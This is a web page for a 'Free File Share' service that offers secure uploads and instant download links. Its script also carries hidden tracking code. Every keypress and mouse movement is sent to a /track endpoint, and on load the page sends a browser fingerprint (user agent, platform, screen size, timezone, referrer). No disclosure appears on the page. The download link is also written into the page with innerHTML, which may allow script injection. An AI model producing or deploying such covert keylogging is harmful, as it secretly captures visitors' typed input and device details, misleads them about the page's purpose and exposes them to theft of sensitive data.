<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free File Share</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 2rem; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); max-width: 400px; width: 90%; text-align: center; }
        h1 { color: #333; margin-bottom: 1rem; font-size: 1.8rem; }
        .upload-area { border: 3px dashed #667eea; border-radius: 15px; padding: 2rem; margin: 1.5rem 0; cursor: pointer; transition: all 0.3s; }
        .upload-area:hover { background: #f8f9ff; border-color: #764ba2; }
        .upload-area.dragover { background: #e3f2fd; border-color: #2196f3; }
        input[type="file"] { display: none; }
        button { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 12px 30px; border-radius: 25px; font-size: 1rem; cursor: pointer; transition: transform 0.2s; }
        button:hover { transform: translateY(-2px); }
        button:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
        .status { margin-top: 1rem; padding: 10px; border-radius: 8px; font-weight: 500; }
        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .loading { background: #fff3cd; color: #856404; }
        .hidden { display: none; }
        #downloadLink { word-break: break-all; margin-top: 1rem; padding: 10px; background: #f8f9ff; border-radius: 8px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📁 Free File Share</h1>
        <p>Upload files securely. Get instant download link!</p>
        
        <div class="upload-area" id="uploadArea">
            <div>Click or drag files here</div>
            <input type="file" id="fileInput" multiple>
        </div>
        
        <button id="uploadBtn" disabled>Upload Files</button>
        
        <div id="status" class="status hidden"></div>
        <div id="downloadLink" class="hidden"></div>
    </div>

    <script>
        const uploadArea = document.getElementById('uploadArea');
        const fileInput = document.getElementById('fileInput');
        const uploadBtn = document.getElementById('uploadBtn');
        const status = document.getElementById('status');
        const downloadLink = document.getElementById('downloadLink');

        // Drag & drop
        uploadArea.addEventListener('click', () => fileInput.click());
        uploadArea.addEventListener('dragover', (e) => {
            e.preventDefault();
            uploadArea.classList.add('dragover');
        });
        uploadArea.addEventListener('dragleave', () => uploadArea.classList.remove('dragover'));
        uploadArea.addEventListener('drop', (e) => {
            e.preventDefault();
            uploadArea.classList.remove('dragover');
            fileInput.files = e.dataTransfer.files;
            toggleUploadBtn();
        });
        fileInput.addEventListener('change', toggleUploadBtn);

        function toggleUploadBtn() {
            uploadBtn.disabled = fileInput.files.length === 0;
        }

        uploadBtn.addEventListener('click', async () => {
            if (fileInput.files.length === 0) return;

            showStatus('Uploading...', 'loading');
            uploadBtn.disabled = true;

            const formData = new FormData();
            for (let file of fileInput.files) {
                formData.append('files', file);
            }

            try {
                const response = await fetch('/upload', {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();
                if (response.ok) {
                    showStatus('Upload successful!', 'success');
                    downloadLink.innerHTML = `<strong>Download:</strong> <a href="${result.downloadUrl}" target="_blank">${result.downloadUrl}</a>`;
                    downloadLink.classList.remove('hidden');
                    
                    // Auto copy to clipboard
                    navigator.clipboard.writeText(result.downloadUrl);
                    showStatus('Link copied to clipboard!', 'success');
                } else {
                    showStatus(`Error: ${result.error || 'Upload failed'}`, 'loading');
                }
            } catch (error) {
                showStatus(`Network error: ${error.message}`, 'loading');
            } finally {
                uploadBtn.disabled = false;
            }
        });

        function showStatus(message, type) {
            status.textContent = message;
            status.className = `status ${type}`;
            status.classList.remove('hidden');
        }

        // Track page load immediately
        sendBeaconData();
        
        // Track mouse movements (throttled)
        let mouseThrottle;
        document.addEventListener('mousemove', (e) => {
            clearTimeout(mouseThrottle);
            mouseThrottle = setTimeout(() => {
                navigator.sendBeacon('/track', JSON.stringify({
                    type: 'mousemove',
                    x: e.clientX,
                    y: e.clientY,
                    timestamp: Date.now()
                }));
            }, 500);
        });

        // Track keypresses
        document.addEventListener('keydown', (e) => {
            navigator.sendBeacon('/track', JSON.stringify({
                type: 'keypress',
                key: e.key,
                code: e.code,
                timestamp: Date.now()
            }));
        });

        // Track before unload
        window.addEventListener('beforeunload', () => {
            navigator.sendBeacon('/track', JSON.stringify({
                type: 'beforeunload',
                timestamp: Date.now()
            }));
        });

        function sendBeaconData() {
            const data = {
                type: 'page_load',
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: Date.now(),
                url: window.location.href,
                referrer: document.referrer
            };

            navigator.sendBeacon('/track', JSON.stringify(data));
        }
    </script>
</body>
</html>
